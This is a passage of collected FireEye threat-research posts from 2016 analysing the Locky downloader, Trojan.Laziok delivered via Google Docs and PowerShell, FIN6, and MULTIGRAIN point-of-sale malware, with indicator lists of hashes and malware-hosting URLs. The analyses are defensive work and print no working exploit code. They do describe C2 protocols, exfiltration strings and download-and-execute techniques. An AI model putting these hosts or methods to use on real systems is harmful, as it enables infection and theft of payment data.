      <td width=""200""><p> 9ab4cbd602ad8e5434e863bf0d84be2f</p> </td> </tr>
    <tr>
      <td width=""200""><p> 9ba65c06057c179efbc8a62f86f2db71</p> </td> </tr>
    <tr>
      <td width=""200""><p> 9bdb39a159774154fabc23d06ad8d131</p> </td> </tr>
    <tr>
      <td width=""200""><p> 9c3ba2e8d172253e9d8ce30735bfbf78</p> </td> </tr>
    <tr>
      <td width=""200""><p> 9cf27a07e0a4a6f6b1a8958241a6a83f</p> </td> </tr>
    <tr>
      <td width=""200""><p> 9e173831c7f300e9dca9ee8725a34c5a</p> </td> </tr>
    <tr>
      <td width=""200""><p> 9e7d24027621c0ecfd13995f2e098e8c</p> </td> </tr>
    <tr>
      <td width=""200""><p> 9f723da52e774a6c5d03d8ba5f6af51f</p> </td> </tr>
    <tr>
      <td width=""200""><p> a0c486b879e20d5ac1774736b48e832b</p> </td> </tr>
    <tr>
      <td width=""200""><p> a152ea9ee04ca9790d195f9f3209b24a</p> </td> </tr>
    <tr>
      <td width=""200""><p> a1803ced57c1917f642ed407fc006659</p> </td> </tr>
    <tr>
      <td width=""200""><p> a1c504f51654200e6d0e424f38700f14</p> </td> </tr>
    <tr>
      <td width=""200""><p> a1d5f30ea6fc30d611c2636da4e763d4</p> </td> </tr>
    <tr>
      <td width=""200""><p> a1e7602b96d78fc37b5e1d271dbab273</p> </td> </tr>
    <tr>
      <td width=""200""><p> a2c5ffc33a96c6b10ae9afdaf5d00e62</p> </td> </tr>
    <tr>
      <td width=""200""><p> a31adc93ea76a4e2dfb6ae199fc0a294</p> </td> </tr>
    <tr>
      <td width=""200""><p> a3aaff686bf34d60b8319ef2525387d3</p> </td> </tr>
    <tr>
      <td width=""200""><p> a3ecea301bbe612ef9e17a502ee94b21</p> </td> </tr>
    <tr>
      <td width=""200""><p> a44b5c01378dd89c1c17565736f6c47b</p> </td> </tr>
    <tr>
      <td width=""200""><p> a4c8b0199f92f9be7b482df2bcce8162</p> </td> </tr>
    <tr>
      <td width=""200""><p> a4cba22ecfa33d1a4ad69be4616eeaf7</p> </td> </tr>
    <tr>
      <td width=""200""><p> a4f19520957bee3d68755a3978fb16be</p> </td> </tr>
    <tr>
      <td width=""200""><p> a61d0ea6e5711135383a3592e6b31e49</p> </td> </tr>
    <tr>
      <td width=""200""><p> a639338fd99cfd50292425d36618074c</p> </td> </tr>
    <tr>
      <td width=""200""><p> a6c5d89df0774fdd1643080548bfe718</p> </td> </tr>
    <tr>
      <td width=""200""><p> a893d3cfce6e8869b35a8140089ec854</p> </td> </tr>
    <tr>
      <td width=""200""><p> a8f2d507661b76a94971dcf7d593fc8a</p> </td> </tr>
    <tr>
      <td width=""200""><p> a9776f2633565419e55f6842a0b74278</p> </td> </tr>
    <tr>
      <td width=""200""><p> a9ce99d1788c13edaa3fb7f92ebb1240</p> </td> </tr>
    <tr>
      <td width=""200""><p> aa48cd40fcfe561bb5cd274549c94d6f</p> </td> </tr>
    <tr>
      <td width=""200""><p> aa5216ce42e1c279042662c018509140</p> </td> </tr>
    <tr>
      <td width=""200""><p> aa735ae056b57471bbe3499517afd057</p> </td> </tr>
    <tr>
      <td width=""200""><p> ac6a922fd8c604eb56da5413c2368be7</p> </td> </tr>
    <tr>
      <td width=""200""><p> ac8ad3eb56d2a94db30d3f4acfe4b548</p> </td> </tr>
    <tr>
      <td width=""200""><p> acfc48ed626369cf0fb6e1872c92e1bd</p> </td> </tr>
    <tr>
      <td width=""200""><p> ad75d090f865cbab68c411682ad2eb89</p> </td> </tr>
    <tr>
      <td width=""200""><p> ad99f483836492e34c072764db219fe4</p> </td> </tr>
    <tr>
      <td width=""200""><p> addd10c396fb3c1998ea451710f6f6f6</p> </td> </tr>
    <tr>
      <td width=""200""><p> aea04d46b9a4097155afcb3a80aafb8f</p> </td> </tr>
    <tr>
      <td width=""200""><p> af60a1f801ee3d5ba256c9354d8e9ca3</p> </td> </tr>
    <tr>
      <td width=""200""><p> af732879ff0b20eb02386a16581c8a4b</p> </td> </tr>
    <tr>
      <td width=""200""><p> afbfbb0fc1e7cbf56732d2afaeb21302</p> </td> </tr>
    <tr>
      <td width=""200""><p> b0737a9732647803bab45e64b4dc8f42</p> </td> </tr>
    <tr>
      <td width=""200""><p> b11bb0abd2a72e0ca88fe9817d42e139</p> </td> </tr>
    <tr>
      <td width=""200""><p> b2e0eae1d879287da6155ffa1ffff440</p> </td> </tr>
    <tr>
      <td width=""200""><p> b371fd7024687fa205135e2f3425822d</p> </td> </tr>
    <tr>
      <td width=""200""><p> b4298ce2eab75b9729ae3ac54e44e4d1</p> </td> </tr>
    <tr>
      <td width=""200""><p> b536f2134d75a4ac257071615e227a7d</p> </td> </tr>
    <tr>
      <td width=""200""><p> b56b456488358fcdc0ce95df7e0309cf</p> </td> </tr>
    <tr>
      <td width=""200""><p> b57618a7098fa9fcc14b8779b71ba62a</p> </td> </tr>
    <tr>
      <td width=""200""><p> b5afb1b35f7ee56218ee1c0d6ba92fb7</p> </td> </tr>
    <tr>
      <td width=""200""><p> b5f1fe0ab8ef34d6429916b6257e682b</p> </td> </tr>
    <tr>
      <td width=""200""><p> b66eb248e1ca0c35bc7e518fa4d5757a</p> </td> </tr>
    <tr>
      <td width=""200""><p> b6f52abceb49c6d38e29de6951f768fa</p> </td> </tr>
    <tr>
      <td width=""200""><p> b7343a1094f139699bc4698343d2b7ad</p> </td> </tr>
    <tr>
      <td width=""200""><p> b80f53f44e737aa1ecc40a1c5cf10a5d</p> </td> </tr>
    <tr>
      <td width=""200""><p> b9057cc24a9d4bde42198d3956ee46e6</p> </td> </tr>
    <tr>
      <td width=""200""><p> b9680d7e427bc2a3ed0320fb15023a88</p> </td> </tr>
    <tr>
      <td width=""200""><p> ba1c5315933c1a4d446bf90eb9d7c8c6</p> </td> </tr>
    <tr>
      <td width=""200""><p> bbb20fe1b97f12934b70cb1a7d2399d4</p> </td> </tr>
    <tr>
      <td width=""200""><p> bbfac3011f9e3b239e4eb9f9d6b82763</p> </td> </tr>
    <tr>
      <td width=""200""><p> bcd595f9eb7fba9fa82c21805ebb1535</p> </td> </tr>
    <tr>
      <td width=""200""><p> bd8c50221e6ec939f7b4df54795bca20</p> </td> </tr>
    <tr>
      <td width=""200""><p> bd9ebb6baf95d25fc54568bb4c37567b</p> </td> </tr>
    <tr>
      <td width=""200""><p> bddd52910f0c40b538418144ae0b63ac</p> </td> </tr>
    <tr>
      <td width=""200""><p> bde66ebf8cd08b301b0b6c3140df5fed</p> </td> </tr>
    <tr>
      <td width=""200""><p> be10e76060c3bbc59c1d87bdc3abeb12</p> </td> </tr>
    <tr>
      <td width=""200""><p> c23c4130ffebf9ffe60136b7099f8603</p> </td> </tr>
    <tr>
      <td width=""200""><p> c2eb3eed3f2082cf05e7c785cfab5487</p> </td> </tr>
    <tr>
      <td width=""200""><p> c36230f577cfa4d25e29be00ada59d91</p> </td> </tr>
    <tr>
      <td width=""200""><p> c39f6e984efcbf40612a3acb780b638a</p> </td> </tr>
    <tr>
      <td width=""200""><p> c528caa8cffd76825748507b8b0ad03e</p> </td> </tr>
    <tr>
      <td width=""200""><p> c5dd6c26c4c1e03fd1ec51cb1dec91ca</p> </td> </tr>
    <tr>
      <td width=""200""><p> c620fef9ebfa83e84c51134d14d44ec8</p> </td> </tr>
    <tr>
      <td width=""200""><p>0c3dbcffb91d154b2b320b2fce972f39</p> </td> </tr>
    <tr>
      <td width=""200""><p>27660806ff465edbe0f285ab67a9a348</p> </td> </tr>
    <tr>
      <td width=""200""><p>36966643d45c09afb42a40fa6f71b38c</p> </td> </tr>
    <tr>
      <td width=""200""><p>458a8c5f99417f5031885116e40117ae</p> </td> </tr>
    <tr>
      <td width=""200""><p>4aebe1ff92fad7c4dba9f8a26b6a61d3</p> </td> </tr>
    <tr>
      <td width=""200""><p>551f94100c04ed328ddeaf4817734eb5</p> </td> </tr>
    <tr>
      <td width=""200""><p>6fb3c026537a0248f4ef40b98a9f1821</p> </td> </tr>
    <tr>
      <td width=""200""><p>acf114610271e97cb58b172d135564bb</p> </td> </tr>
    <tr>
      <td width=""200""><p>ccabfa1d72797c635eb241f82a892e22</p> </td> </tr>
    <tr>
      <td width=""200""><p>cf5451b8b53092266321a421ba9224ca</p> </td> </tr>
    <tr>
      <td width=""200""><p>d5ea3a22bce77e4bc279ca7903c3288a</p> </td> </tr>
    <tr>
      <td width=""200""><p>d8caad151e07025fdbf5f3c26e3ceaff</p> </td> </tr>
    <tr>
      <td width=""200""><p>eb7d7dacebba8741c2d483f0fcabdc82</p> </td> </tr></tbody></table>
 <p> </p>",http://www.fireeye.com/blog/threat-research/2016/04/rumms-android-malware.html
New Downloader for Locky,"<p>Through DTI Intelligence analysis, We have been observing Locky
  malware rise to fame recently. Locky is ransomware that is
  aggressively distributed via downloaders attached in spam emails, and
  it may have surpassed the Dridex banking trojan in popularity. In
  previous campaigns, the ransomware was downloaded by a macro-based
  downloader or a JavaScript downloader. However, in April 2016, FireEye
  Labs observed a new development in the way this ransomware is
  downloaded onto a compromised system.</p>
 <p>In a recent Locky spam campaign using ‘Photos’ as a theme (Figure
  1), we saw a new binary being downloaded by the JavaScript found in
  the attached ZIP file, as seen in Figure 2. This JavaScript downloader
  reached out to “<i>hxxp://mrsweeter.ru/87h78rf33g</i>”.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Locky%20Baltazar%20Sa/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Recent Locky spam campaign</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Locky%20Baltazar%20Sa/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2. Locky spam ZIP attachment containing
    JS downloader</span></p>
 <h5>New Downloader (MD5: c5ad81d8d986c92f90d0462bc06ac9c6)</h5>
 <p>The new downloader has a custom network communication protocol. In
  our tests, it only downloads the Locky ransomware as its payload. This
  malware seems to be in its early development stage as it only supports
  commands for download and execution of an executable and deletion of
  itself. This means the malware can also update its own binary, leading
  to the possiblity of more commands being supported.</p>
 <p>The malware communicates with its command and control (C2) over HTTP
  using a custom encryption algorithm. The first beacon to the
  hard-coded C2 asks for a task to be executed by the malware. An
  example of the unencrypted message sent to C2 is formatted, as shown
  in Figure 3.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Locky%20Baltazar%20Sa/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3. Raw message format</span></p>
 <p>ID1 – derived from HDD Volume Serial Number<br /> ID2 – 2222222222
  (hard-coded value)<br /> ID3 – random generated number<br /> ID4 –
  derived from bit-masked OS version and system architecture<br /> time
  – UTC time the message is created<br /> type – getjob (hard-coded value)</p>
 <p>This beacon string is encrypted with the custom algorithm shown in
  Figure 4 before sending it to its C2. The custom encryption is
  composed of XOR and bit shifts.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Locky%20Baltazar%20Sa/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4. Custom string encryption</span></p>
 <p>After encryption, an ‘A’ (0x41h) character is appended to the
  encrypted message. The beacon request is delivered via an HTTP POST
  request. In this sample, it reaches out to
  hxxp://<i>raprockacademy.com/api</i>, as shown in Figure 5.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Locky%20Baltazar%20Sa/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5. Encrypted HTTP POST request and C2 response</span></p>
 <p>The C2 server responds with an encrypted message that tells the
  malware what action to take. Decrypting the C2 response is possible
  with the Python code shown in Figure 6.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Locky%20Baltazar%20Sa/Fig6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6. C2 reponse decryptor</span></p>
 <p>The decrypted message shows a URL to download a binary and, in this
  case, an updated Locky binary.<img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Locky%20Baltazar%20Sa/Fig7.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 7. Decrypted message</span></p>
 <p>The ‘command’ field can be ‘UPDATE’, ‘NOTASKS’, and ‘DEL’ –
  ‘NOTASKS’ being no further instructions from the C2 for the moment and
  ‘DEL’ for deletion of the downloader from the victim machine through
  drop and execute of a batch file.</p>
 <p>Further inspection of this malware reveals several small DLL files
  embedded in the binary. These DLLs may be used depending on the OS
  environment of the compromised system. The following is a brief
  description of the embedded DLLs:</p>
 <p>1.  32-bit and 64-bit DLLs, which executes a file via the
  CreateProcessW API.<br /> 2.  64-bit binary used for bypassing User
  Account Control (UAC). Debug symbol path is not stripped in the
  binary:<br />            
  D:\Test\Build\AvoidUAC\x64\Release\Test64Shellcode.pdb<br /> 3.    
  64-bit binary which can elevate privileges for a specified process.</p>
 <h5>Locky DGA update</h5>
 <p>The Locky sample downloaded (MD5: 357c162a35c3623d1a1791c18e9f56e7)
  has updated its DGA. The DGA has the following differences:</p>
 <ul> <li>TLD is not randomly generated and is picked from the following
    list: [&quot;ru&quot;, &quot;info&quot;, &quot;biz&quot;,
    &quot;click&quot;, &quot;su&quot;, &quot;work&quot;, &quot;pl&quot;,
    &quot;org&quot;, &quot;pw&quot;, &quot;xyz&quot;]</li> <li>Constant
    0x2709a354 is no longer used</li> <li>Introduced new constants:
    0x1bf5, 0xd8efffff, 0x65cad</li> </ul>
 <p>We provide an update to the shared DGA code from our previous <a href=""https://www.fireeye.com/blog/threat-research/2016/03/surge_in_spam_campai.html"">blog</a>,
  as shown in Figure 8.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Locky%20Baltazar%20Sa/Fig8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8. Updated Locky Domain Generation Algorithm</span></p>
 <h5>Conclusion</h5>
 <p>The actors behind the Locky ransomware are actively seeking new ways
  to successfully install their malware on victim computers. That may be
  one of the reasons this new downloader is used and being introduced to
  the current distribution framework. This downloader can be a new
  platform for installing other malware (“Pay-per-Install”).</p>
 <h5>IoCs</h5>
 <p>Spam EML</p>
 <ul>
  <li>7b45833d87d8bd38c44cbaeece65dbbd04e12b8c1ef81a383cf7f0fce9832660</li>
  <li>9a0788ba4e0666e082e18d61fad0fa9d985e1c3223f910a50ec3834ba44cce10</li> </ul>
 <p>MD5s</p>
 <ul> <li>b0ca8c5881c1d27684c23db7a88d11e1</li>
  <li>c5ad81d8d986c92f90d0462bc06ac9c6</li>
  <li>ebf1f8951ec79f2e6bf40e6981c7dbfc</li>
  <li>357c162a35c3623d1a1791c18e9f56e72bcd76f6ef9f4cbcf5952f62b9bc8a08</li>
  <li>b0ca8c5881c1d27684c23db7a88d11e1</li>
  <li>c325dcf4c6c1e2b62a7c5b1245985083</li> </ul>
 <p>URLs</p>
 <ul> <li>mrsweeter.ru/87h78rf33g</li>
  <li>185.130.7.22/files/sBpFSa.exe</li>
  <li>185.130.7.22/files/WRwe3X.exe</li>
  <li>slater.chat.ru/gvtg77996</li>
  <li>hundeschulegoerg.de/gvtg77996</li>
  <li>buhjolk.at/files/dIseJh.exe</li>
  <li>buhjolk.at/files/aY5TFn.exe</li> </ul>",http://www.fireeye.com/blog/threat-research/2016/04/new_downloader_forl.html
PowerShell used for spreading Trojan.Laziok through Google Docs,"<h5>
  <b>Introduction</b></h5>
 <p>Through our multi-flow detection capability, we recently identified
  malicious actors spreading Trojan.Laziok malware via Google Docs. We
  observed that the attackers managed to upload the payload to Google
  Docs in March 2016. During the brief time it was live, users accessing
  the malicious page from Internet Explorer (versions 3 to 11) would
  have become the unwilling hosts for the infostealer payload without
  any security warning. After we alerted Google about its presence, they
  quickly cleaned it and the original URL involved in propagation also
  went down.</p>
 <h5>
  <b>The Payload</b></h5>
 <p>Trojan.Laziok reportedly serves as a reconnaissance tool that
  attackers use to collect information about systems they have
  compromised. It has been seen previously in a cyber espionage campaign
  targeting the energy sector, particularly in the Middle East<a name=""_ednref1""></a>[i]. In that campaign, the malware was spread
  using spam emails with malicious attachments exploiting the
  CVE-2012-0158 vulnerability.</p>
 <p>The techniques used for delivery in this case involve exploiting
  users running versions of Internet Explorer that support VBScript.</p>
 <h5>
  <b>Attack Delivery Point</b></h5>
 <p>The attacker stored the first stage of the attack on the Polish
  domain hosting site cba[.]pl. As seen in Figure 1, the first stage
  initiates the attack by running obfuscated JavaScript from
  www.younglean. cba[.]pl/lean/.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Laziok/Fig1.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 1. Obfuscated code shown in the response</span></p>
 <p>Once decoded, the JavaScript unpacks and runs vulnerability
  CVE-2014-6332 through VBScript execution in Internet Explorer
  (versions 3 to 11), exploiting the memory corruption vulnerability in
  Windows Object Linking and Embedding (OLE) Automation to bypass
  operating system security utilities and other protections and thus
  enabling attackers to enter into ”GodMode” function.  CVE-2014-6332
  usage, along with GodMode privileges abuse, has been used as a
  combination since late 2014 via a known PoC[ii], as seen Figures 2a
  and 2b:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Laziok/Fig2a.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 2a. CVE-2014-6332 usage</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Laziok/Fig2b.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 2b. Function call to runmumaa() after
    “GodMode” access changing the safemode flags</span></p>
 <p>Next, the runmaa() function downloads the malicious payload from
  Google Docs through PowerShell. PowerShell is used to download malware
  and execute it inside defined %APPDATA% environment variable path via
  DownloadFile and ShellExecute commands. All VBScript instructions and
  PowerShell scripts are part of the obfuscated script inside
  document.write(unescape), shown in Figure 1.</p>
 <p>PowerShell is also useful for bypassing anti-virus software because
  it is able to inject payloads directly in memory. We have previously
  discussed <a href=""mailto:https://www.fireeye.com/blog/threat-research/2015/12/uncovering_activepower.html"">active
    PowerShell data stealing campaigns from Russia</a><a name=""_ednref3""></a>[iii]. It seems the technique is still popular
  among campaigns involving infostealers, and this one was able to evade
  Google Docs security checks. The payload download link from Google
  Docs – seen in Figure 3 showing the de-obfuscated code – fetched live
  malware for victims who ended up on the aforementioned Polish website.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Laziok/Fig3.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 3. Using PowerShell to fetch payload
    hosted on Google docs link</span></p>
 <h5>
  <b>Payload Details</b></h5>
 <p>The downloaded payload is infostealer Trojan.Laziok, as evidenced by
  its callback trace and the presence of the following data:</p>
 <p>00406471 PUSH 21279964.00414EED ASCII &quot;open&quot;<br />
  0040649C MOV EDX,21279964.004166A8 ASCII
  &quot;idcontact.php?COMPUTER=&quot;<br /> 004064B1 MOV
  EDX,21279964.00415D6D ASCII &quot;&amp;steam=&quot;<br /> 004064D2 MOV
  EDX,21279964.00416D96 ASCII &quot;&amp;origin=&quot;<br /> 004064F3
  MOV EDX,21279964.00416659 ASCII &quot;&amp;webnavig=&quot;<br />
  00406514 MOV EDX,21279964.00416B17 ASCII &quot;&amp;java=&quot;<br />
  00406535 MOV EDX,21279964.00415601 ASCII &quot;&amp;net=&quot;<br />
  00406556 MOV EDX,21279964.00414F76 ASCII
  &quot;&amp;memoireRAMbytes=&quot;<br /> 0040656B MOV
  EDX,21279964.0041628C ASCII &quot;&amp;diskhard=&quot;<br /> 0040658E
  MOV EDX,21279964.00414277 ASCII &quot;&amp;avname=&quot;<br />
  004065AF MOV EDX,21279964.00416BFC ASCII
  &quot;&amp;parefire=&quot;<br /> 004065D0 MOV EDX,21279964.0041474A
  ASCII &quot;&amp;install=&quot;<br /> 004065E5 MOV
  EDX,21279964.00414E12 ASCII &quot;&amp;gpu=&quot;<br /> 00406606 MOV
  EDX,21279964.004164B7 ASCII &quot;&amp;cpu=&quot;<br /> 00406659 MOV
  EDX,21279964.004170F9 ASCII &quot;bkill.php&quot;<br /> 004066B9 MOV
  EDX,21279964.00415B79 ASCII
  &quot;0000025C00000C6B000008BB000006ED0000088900000453000004CE0000054100000B75&quot;<br />
  004066ED MOV EDX,21279964.004149CD ASCII
  &quot;install_info.php&quot;<br /> 00406735 MOV EDX,21279964.00415951
  ASCII &quot;pinginfo.php&quot;<br /> 00406772 MOV
  EDX,21279964.00416B6B ASCII &quot;get.php?IP=&quot;<br /> 00406787 MOV
  EDX,21279964.0041463F ASCII &quot;&amp;COMPUTER=&quot;<br /> 0040679C
  MOV EDX,21279964.00416DF5 ASCII &quot;&amp;OS=&quot;<br /> 004067B1
  MOV EDX,21279964.00415CB8 ASCII &quot;&amp;COUNTRY=&quot;<br />
  004067C6 MOV EDX,21279964.00416069 ASCII &quot;&amp;HWID=&quot;<br />
  004067DB MOV EDX,21279964.00414740 ASCII
  &quot;&amp;INSTALL=&quot;<br /> 004067F0 MOV EDX,21279964.00415BE3
  ASCII &quot;&amp;PING=&quot;<br /> 00406805 MOV EDX,21279964.004158E2
  ASCII &quot;&amp;INSTAL=&quot;<br /> 0040681A MOV
  EDX,21279964.00414D3E ASCII &quot;&amp;V=&quot;<br /> 0040682F MOV
  EDX,21279964.00414E5D ASCII &quot;&amp;Arch=&quot;<br /> 00406872 MOV
  EDX,21279964.00414166 ASCII &quot;post.php&quot;<br /> 00406899 MOV
  EDX,21279964.00414EB0 ASCII &quot;*0&quot;</p>
 <p>Above instructions of the payload, when unpacked, highlight the
  typical traits of Trojan.Laziok. The infostealer tries to collect
  information about computer name, CPU details, RAM size, location
  (country), and installed software and antivirus (AV). Our MVX engine
  also shows that it attempts to access popular AV files, such as
  installer files for Kaspersky, McAfee, Symantec and Bitdefender. It
  also blends in by copying itself to well-known folders and processes
  such as:</p>
 <p>
  <span class=""code"">C:\Documents and Settings\admin\Application Data\System\Oracle\smss.exe</span></p>
 <p>The payload attempts to call back to a known bad Polish server [hxxp://]193.189.117[.]36]</p>
 <p>We observed the first instance of this attack on March 13, 2016. The
  malware was available on Google Docs until we alerted Google about its
  presence. Users are not usually able to download malicious content
  from Google Docs because Google actively scans and blocks malicious
  content. The fact that this sample was available and downloadable on
  Google Docs suggests that the malware evaded Google’s security checks.
  Following our notification, Google promptly removed the malicious file
  and it can no longer be fetched.</p>
 <h5>
  <b>Conclusion</b></h5>
 <p>FireEye’s multi-flow detection mechanism catches this at every
  level, from the point of entry to the callback – and the malware is
  not able to bypass FireEye sandbox security. PowerShell data stealing
  campaigns have also been observed spreading through document files
  with embedded macros, so corporate environments need to be extra
  careful regarding the policy and regulation of PowerShell usage –
  especially since the abuse can involve some trusted sources that
  sometimes have exemptions, with whitelists from some security vendors
  being one example. Or they can keep using FireEye.<br /> </p>
 <p> </p>
 <p> </p>
 <p>[i]
  http://www.symantec.com/connect/blogs/new-reconnaissance-threat-trojanlaziok-targets-energy-sector<br />
  [ii]
  http://blog.trendmicro.com/trendlabs-security-intelligence/a-killer-combo-critical-vulnerability-and-godmode-exploitation-on-cve-2014-6332/<br />
  [iii] https://www.fireeye.com/blog/threat-research/2015/12/uncovering_activepower.html</p>
 <p> </p>
 <p> </p>",http://www.fireeye.com/blog/threat-research/2016/04/powershell_used_for.html
Follow The Money: Dissecting the Operations of the Cyber Crime Group FIN6,"<p>Cybercrime operations can be intricate and elaborate, with careful
  planning needed to navigate the various obstacles separating an
  attacker from a payout. Yet reports on these operations are often
  fragmentary, as the full scope of attacker activity typically occurs
  beyond the view of any one group of investigators.</p>
 <p>FireEye Threat Intelligence and iSIGHT Partners recently combined
  our research to provide a unique and extensive look into the
  activities of one particular threat group: FIN6.</p>
 <p>FIN6 is a cyber criminal group that steals payment card data for
  monetization from targets predominately in the hospitality and retail
  sectors. The group was observed aggressively targeting and
  compromising point-of-sale (POS) systems and making off with millions
  of payment card numbers. These card numbers were later sold on a
  particular underground “card shop,” potentially earning FIN6 hundreds
  of millions of dollars.</p>
 <p>This report provides wide-ranging, end-to-end visibility into FIN6’s
  cybercrime operations, detailing initial intrusion, methods used to
  navigate the victim network, other tactics, techniques, and procedures
  (TTPs), and the sale of stolen payment card data in an underground marketplace.</p>
 <p>
  <a href=""https://www2.fireeye.com/WEB-RPT-FIN6.html"">The story of FIN6
    shows how real-world threat actors operate.</a></p>
 <p>Please join us for a webinar on Thursday, May 5 at 11:00am ET/8:00am
  PT. <a href=""https://engage.vevent.com/index.jsp?eid=4929&amp;seid=1489&amp;code=blog"" target=""_blank"">You can register here.</a><br /> </p>
 <p>The video below offers an overview of the methods FIN6 uses.<br /> </p>
 <p style=""text-align: center;""></p>",http://www.fireeye.com/blog/threat-research/2016/04/follow_the_money.html
MULTIGRAIN – Point of Sale Attackers Make an Unhealthy Addition to the Pantry,"<p>FireEye recently discovered a new variant of a point of sale (POS)
  malware family known as <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/newposthings-has-new-pos-things/"">NewPosThings</a>.
  This variant, which we call “MULTIGRAIN”, consists largely of a subset
  of slightly modified code from NewPosThings. The variant is highly
  targeted, digitally signed, and exfiltrates stolen payment card data
  over DNS. The addition of DNS-based exfiltration is new for this
  malware family; however, other POS malware families such as
  BernhardPOS and FrameworkPOS have used this technique in the past.</p>
 <p>Using DNS for data exfiltration provides several advantages to the
  attacker. Sensitive environments that process card data will often
  monitor, restrict, or entirely block the HTTP or FTP traffic often
  used for exfiltration in other environments. While these common
  internet protocols may be disabled within a restrictive card
  processing environment, DNS is still necessary to resolve hostnames
  within the corporate environment and is unlikely to be blocked.</p>
 <h5>
  <b>Specific Targeting</b></h5>
 <p>Several POS malware families will parse through running processes
  and scrape a large number of them in the hopes of locating card data.
  In contrast to that approach, MULTIGRAIN has been custom-engineered to
  target a specific point of sale process: <i>multi.exe</i>, associated
  with a popular back-end card authorization and POS (electronic draft
  capture) server software package. If <i>multi.exe</i> is not found on
  the infected host, the malware will not install and will simply delete
  itself. This shows that while developing or building their malware,
  the attackers had a very specific knowledge of the target environment
  and knew this process would be running.</p>
 <h5>
  <b>Persistence</b></h5>
 <p>If the targeted POS process is running on the host and the malware
  is executed with a command line parameter designating “installation
  mode”, MULTIGRAIN copies itself to the hardcoded location
  “<i>c:\windows\wme.exe</i>” and installs a service with the properties
  shown in Figure 1.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/multigrain/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Service properties used by MULTIGRAIN
    POS malware</span>
  <b></b></p>
 <h5>
  <b>Initial Beaconing</b></h5>
 <p>The malware collects the volume serial number and part of the MAC
  address and creates a hash of the concatenated value using the DJB2
  hashing algorithm. The resulting hash is then combined with the
  computer name and a version number and all three components are then
  encoded with a custom <a href=""https://en.wikipedia.org/wiki/Base32"">Base32</a> encoding
  algorithm. The malware then makes a DNS query with this information to
  a hardcoded domain, notifying the attacker of a successful
  installation. The process is shown in Figure 2.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/multigrain/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2. Construction of Installation Beacon</span></p>
 <h5>
  <b>Memory-Scraping and Card Data Exfiltration</b></h5>
 <p>Once installed and executing, MULTIGRAIN begins scraping the memory
  of the targeted process for <a href=""http://www.magtek.com/documentation/public/99800004-1.08.pdf"">Track
  2</a> card data, validating that data using the <a href=""https://en.wikipedia.org/wiki/Luhn_algorithm"">Luhn
  algorithm</a>. Track 2 data will normally contain the PAN (Primary
  Account Number), Expiration Date, Service Code and optionally a
  CVV/CVC number, data which will typically be sufficient in most
  scenarios to attempt “card-present” and, and in some cases, “<a href=""https://en.wikipedia.org/wiki/Card_not_present_transaction""><i>card-not-present</i></a>” fraud.</p>
 <p>Each Track 2 record is first encrypted with a 1024-bit RSA public
  key, pushed through the same custom Base32 encoding process as used in
  the installation beacon, and then stored in a buffer. Every five
  minutes, the malware checks this buffer to see if any card data is
  ready for exfiltration. If card data is present, the individual
  encrypted and encoded Track 2 data record for each card is sent over
  the network by means of a DNS query made by the malware. The process
  is shown in Figure 3.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/multigrain/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3. Track 2 Card Data Encoding and Exfiltration</span></p>
 <h5>
  <b>Base32 Encoding</b></h5>
 <p>Both the installation beacon and the stolen card data are encoded
  with an unusual encoding algorithm – <a href=""https://en.wikipedia.org/wiki/Base32"">Base32</a> – before being
  transmitted via DNS queries. The choice of Base32 is interesting as <a href=""https://en.wikipedia.org/wiki/Base64"">Base64</a> is better known
  and more widely used (for instance in the <a href=""https://en.wikipedia.org/wiki/MIME"">MIME</a> standard used by
  email attachments). Using Base32 will actually result in the data
  taking up 20 percent more space than Base64, so the attackers were
  unconcerned with the efficiency of bandwidth.</p>
 <p>One possible reason for selecting Base32 is the relative obscurity
  of the algorithm. Security and data loss prevention (DLP) products are
  more likely to detect Base64 encoding and in some cases can
  automatically decode the data, which could result in DLP devices
  identifying the exfiltration.</p>
 <h5>
  <b>Code Reuse</b></h5>
 <p>Elements of the code from MULTIGRAIN show strong similarities to the
  POS malware family known as NewPosThings. Shared code elements include:</p>
 <ul> <li>The code used to scrape a process for card data</li> <li>The
    DJB2 hashing algorithm used as part of creating a system ID</li> </ul>
 <p>Two other examples from binary disassembly are shown below: the
  “<i>connect/3</i>” network beacon (Figure 4 – seemingly unused in
  MULTIGRAIN) and similarities in the construction of the installation
  beacon (Figure 5).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/multigrain/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4. “Connect/3” network beacon comparison
